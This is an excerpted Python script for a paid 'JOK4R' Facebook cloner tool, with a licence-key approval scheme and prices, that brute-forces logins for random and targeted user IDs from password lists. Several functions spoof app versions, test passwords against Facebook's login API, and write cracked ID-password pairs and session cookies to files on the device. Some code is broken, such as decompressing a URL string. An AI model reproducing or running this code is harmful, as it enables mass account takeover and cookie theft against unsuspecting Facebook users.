...
try:
    prox= requests.get('https://github.com/Jok4rsoj1b4/PAID-404/blob/main/proxies.txt').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/Jok4rsoj1b4/PAID-404/blob/main/proxies.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://github.com/Jok4rsoj1b4/PAID-404/blob/main/Aprov.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
def getKey():
    ...
    return "JOK4R-"+myid+xp
km=zlib.decompress('https://github.com/Jok4rsoj1b4/PAID-404/blob/main/Aprov.txt').text.decode()
def xi():
    global km
    j=getKey()
...
def aprv():
    ...
    if k in r:
        ...
        print("\033[1;92mYour Token is successfully Approved\33[1;37m")
                ...
                print('\033[1;37m----------------------------------------------')               
                print('\033[1;32m 1-Month Price   : 500 TAKA BD')
                print('\033[1;37m----------------------------------------------')               
                print('\033[1;32m 15-Days Price   : 200 TAKA BD')
                print('\033[1;37m----------------------------------------------')               
                print(f" Your Key: {k}")
                print('\033[1;37m----------------------------------------------')                
                input('\033[1;37m[Press Enter]')
                os.system("xdg-open https://wa.me/+8801609859866?text={k}")
                aprv()
                sys.exit()
...
logo=(""" \033[1;37m  ░░░░░██╗░█████╗░██╗░░██╗░░██╗██╗██████╗░
  ...
  \033[1;30m ╚█████╔╝╚█████╔╝██║░╚██╗╚════██║██║░░██║
   \033[1;32m░╚════╝░░╚════╝░╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝
    \033[1;34m===HACKER===JOK4R===SOJIB===TOOIS==
\x1b[1;97m ---------------------------------------------
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  JOK4R-404
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  JOK4R-SOJ1B
        ...
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/JOK4R-COOKIE.txt') 
                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/JOK4R-OK.txt')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100078180585996');menu()
                        	     ...
                        	     os.system('xdg-open https://wa.me/+8801609859866');menu()
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM JOK4R TOOL')
                                linex()
                                input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/veerkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE JOK4R TOOL');time.sleep(2);linex();exit() 
                        else:
...
def pak():
                ...
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/JOK4R SOJIB-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/JOK4R SOJIB-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  JOK4R TOOL AFG RANDOM CLONER MENU')
                linex()
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mJOK4R TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[JOK4R-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m[JOK4R-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[JOK4R-CP]  '+ids+' | '+pas+'\033[1;97m')
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;37m [JOK4R-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in VEER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [JOK4R-OK] %s | %s'%(ids,pas))
                                open('/sdcard/JOK4R-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [JOK4R] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[JOK4R-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/JOK4R-M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/JOK4R-M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[JOK4R-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/JOK4R-M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JOK4R-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[LEGEN-JOK4R-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/JOK4R-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [JOK4R-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOK4R-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JOK4R-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [JOK4R-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/JOK4R-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JOK4R-OK] '+uid+' | '+pas+'\033[1;97m')
